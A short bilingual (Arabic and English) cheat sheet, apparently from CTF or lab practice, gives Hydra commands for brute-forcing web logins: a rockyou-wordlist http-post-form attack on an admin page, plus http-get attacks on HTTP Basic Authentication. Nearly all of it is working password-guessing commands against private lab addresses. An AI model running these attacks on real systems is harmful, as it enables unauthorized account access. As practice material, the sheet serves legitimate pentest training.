on login 
`hydra -f -V -l username -P /usr/share/wordlists/rockyou.txt 10.82.135.6 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"`




معلومات الخطا من الموقع نفسه
حق pass ,user  من اداة burbsuit





///////////////////////////////////////////////////////

إذا الموقع يستخدم **HTTP Basic Authentication** (نافذة تطلب اسم مستخدم وكلمة مرور من المتصفح)، فإن Hydra يدعمها مباشرة.

	hydra -L users.txt -P passwords.txt -s portnumber TARGET http-get /

Ex:
	hydra -L users.txt -P passwords.txt 10.128.163.215 -s 8080 http-get /



# أظهر النتائج أثناء العمل

	hydra -V -L users.txt -P passwords.txt 10.128.163.215 -s 8080 http-get /